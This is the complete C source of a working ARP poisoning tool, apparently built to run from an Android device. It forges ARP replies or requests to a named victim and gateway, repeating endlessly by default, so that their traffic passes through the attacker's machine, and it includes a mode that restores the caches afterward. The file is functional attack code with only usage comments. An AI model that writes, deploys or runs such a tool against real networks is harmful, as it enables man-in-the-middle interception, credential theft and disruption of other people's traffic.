// arp_tool.c — ARP poison/restore tool (statically compiled, run on the Android host)
// Usage: arp_tool <iface> <attacker_mac> <victim_ip> <victim_mac> <gateway_ip> <gateway_mac> <mode> [interval_ms] [count]
// mode: poison(unsolicited reply) / reqpoison(ARP request poisoning) / restore
// count=0 means an infinite loop, kill to stop; restore must pass an explicit count to avoid an infinite loop.
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>

struct __attribute__((packed)) arp_hdr {
    uint16_t htype;
    uint16_t ptype;
    uint8_t  hlen;
    uint8_t  plen;
    uint16_t oper;
    uint8_t  sha[6];
    uint32_t spa;
    uint8_t  tha[6];
    uint32_t tpa;
};

struct __attribute__((packed)) eth_arp {
    uint8_t  dst[6];
    uint8_t  src[6];
    uint16_t eth_type;
    struct arp_hdr arp;
};

static int parse_mac(const char *s, uint8_t out[6]) {
    unsigned int v[6];
    if (sscanf(s, "%x:%x:%x:%x:%x:%x", &v[0],&v[1],&v[2],&v[3],&v[4],&v[5]) != 6) return -1;
    for (int i=0;i<6;i++) out[i]=(uint8_t)v[i];
    return 0;
}

static void fill(struct eth_arp *p, const uint8_t *dst, const uint8_t *src,
                 const uint8_t *sender_mac, const char *sender_ip,
                 const uint8_t *target_mac, const char *target_ip, uint16_t oper) {
    memset(p, 0, sizeof(*p));
    memcpy(p->dst, dst, 6);
    memcpy(p->src, src, 6);
    p->eth_type = htons(ETH_P_ARP);
    p->arp.htype = htons(1);
    p->arp.ptype = htons(ETH_P_IP);
    p->arp.hlen = 6;
    p->arp.plen = 4;
    p->arp.oper = htons(oper);
    memcpy(p->arp.sha, sender_mac, 6);
    p->arp.spa = inet_addr(sender_ip);
    if (target_mac) memcpy(p->arp.tha, target_mac, 6); /* NULL => all-zero (REQUEST semantics) */
    p->arp.tpa = inet_addr(target_ip);
}

int main(int argc, char **argv) {
    if (argc < 8) {
        fprintf(stderr, "usage: %s <iface> <attacker_mac> <victim_ip> <victim_mac> <gateway_ip> <gateway_mac> <mode> [interval_ms] [count]\n", argv[0]);
        fprintf(stderr, "mode: poison | reqpoison | restore\n");
        return 2;
    }
    const char *iface = argv[1];
    uint8_t amac[6], vmac[6], gmac[6], zero[6] = {0};
    if (parse_mac(argv[2], amac) || parse_mac(argv[4], vmac) || parse_mac(argv[6], gmac)) {
        fprintf(stderr, "bad mac\n"); return 2;
    }
    const char *vip = argv[3], *gip = argv[5];
    const char *mode = argv[7];
    int interval = argc > 8 ? atoi(argv[8]) : 1000;
    int count = argc > 9 ? atoi(argv[9]) : 0; /* 0 = infinite */

    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (fd < 0) { perror("socket"); return 1; }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);
    if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0) { perror("ioctl ifindex"); return 1; }

    struct sockaddr_ll sll;
    memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_protocol = htons(ETH_P_ARP);
    sll.sll_ifindex = ifr.ifr_ifindex;
    if (bind(fd, (struct sockaddr*)&sll, sizeof(sll)) < 0) { perror("bind"); return 1; }

    struct eth_arp to_victim, to_gw;
    if (strcmp(mode, "restore") == 0) {
        fill(&to_victim, vmac, gmac, gmac, gip, vmac, vip, ARPOP_REPLY);
        fill(&to_gw,     gmac, vmac, vmac, vip, gmac, gip, ARPOP_REPLY);
    } else if (strcmp(mode, "reqpoison") == 0) {
        /* ARP request poisoning: sender uses the victim identity (gateway/vivo), tha=0, forces the peer to cache the mapping */
        fill(&to_victim, vmac, amac, amac, gip, zero, vip, ARPOP_REQUEST);
        fill(&to_gw,     gmac, amac, amac, vip, zero, gip, ARPOP_REQUEST);
    } else {
        /* poison：unsolicited reply */
        fill(&to_victim, vmac, amac, amac, gip, vmac, vip, ARPOP_REPLY);
        fill(&to_gw,     gmac, amac, amac, vip, gmac, gip, ARPOP_REPLY);
    }

    int sent = 0;
    for (;;) {
        if (send(fd, &to_victim, sizeof(to_victim), 0) < 0) perror("send victim");
        if (send(fd, &to_gw, sizeof(to_gw), 0) < 0) perror("send gw");
        sent += 2;
        printf("sent %s x%d (victim=%s -> gw=%s)\n", mode, sent, vip, gip);
        fflush(stdout);
        if (count > 0 && sent >= count * 2) break;
        usleep((useconds_t)interval * 1000);
    }
    close(fd);
    return 0;
}
